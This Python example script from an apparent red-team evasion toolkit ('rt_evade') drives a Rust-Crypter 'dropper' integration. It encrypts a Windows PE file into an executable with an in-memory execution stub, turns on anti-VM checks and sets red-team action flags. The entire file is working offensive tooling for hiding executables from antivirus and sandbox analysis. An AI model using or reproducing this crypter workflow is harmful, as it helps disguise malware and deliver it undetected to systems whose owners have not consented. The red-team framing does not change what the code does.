#!/usr/bin/env python3
"""Example script demonstrating Rust-Crypter integration.

This script shows how to use the Rust-Crypter integration to encrypt PE files
and generate in-memory execution stubs.
"""
import os
import sys
import logging
from pathlib import Path

# Add the src directory to the path so we can import rt_evade
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from rt_evade.dropper.rust_crypter import RustCrypterIntegration, RustCrypterConfig

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


def main():
    """Main example function."""
    # Set required environment variables
    os.environ["REDTEAM_MODE"] = "true"
    os.environ["ALLOW_ACTIONS"] = "true"
    
    # Example PE file path (you would replace this with your actual PE file)
    pe_file_path = Path("samples/out.bin")  # Using the sample from the project
    
    if not pe_file_path.exists():
        logger.error("PE file not found: %s", pe_file_path)
        logger.info("Please place a PE file at %s or update the path", pe_file_path)
        return 1
    
    # Load the PE file
    logger.info("Loading PE file: %s", pe_file_path)
    pe_data = pe_file_path.read_bytes()
    logger.info("Loaded PE file: %d bytes", len(pe_data))
    
    # Create Rust-Crypter configuration
    config = RustCrypterConfig(
        rust_crypter_path=None,  # Auto-detect
        target_architecture="x86_64-pc-windows-gnu",
        build_mode="release",
        anti_vm=True,
        max_file_size=5 * 1024 * 1024,  # 5MB
    )
    
    try:
        # Initialize Rust-Crypter integration
        logger.info("Initializing Rust-Crypter integration...")
        rust_crypter = RustCrypterIntegration(config)
        
        # Create encrypted payload with stub
        logger.info("Creating encrypted payload with stub...")
        output_path = Path("encrypted_payload.exe")
        stub_path = rust_crypter.create_encrypted_payload(pe_data, output_path)
        
        # Generate and display report
        report = rust_crypter.get_encryption_report(pe_data, b"", stub_path)
        
        logger.info("=== Rust-Crypter Integration Report ===")
        logger.info("Original PE size: %d bytes", report["original_size"])
        logger.info("Stub executable size: %d bytes", report["stub_size"])
        logger.info("Total size: %d bytes", report["total_size"])
        logger.info("Compression ratio: %.2f%%", report["compression_ratio"])
        logger.info("Target architecture: %s", report["target_architecture"])
        logger.info("Build mode: %s", report["build_mode"])
        logger.info("Anti-VM enabled: %s", report["anti_vm_enabled"])
        logger.info("Stub hash: %s", report["stub_hash"])
        logger.info("Output stub: %s", stub_path)
        
        logger.info("Rust-Crypter integration completed successfully!")
        return 0
        
    except Exception as e:
        logger.error("Rust-Crypter integration failed: %s", e)
        return 1


if __name__ == "__main__":
    sys.exit(main())
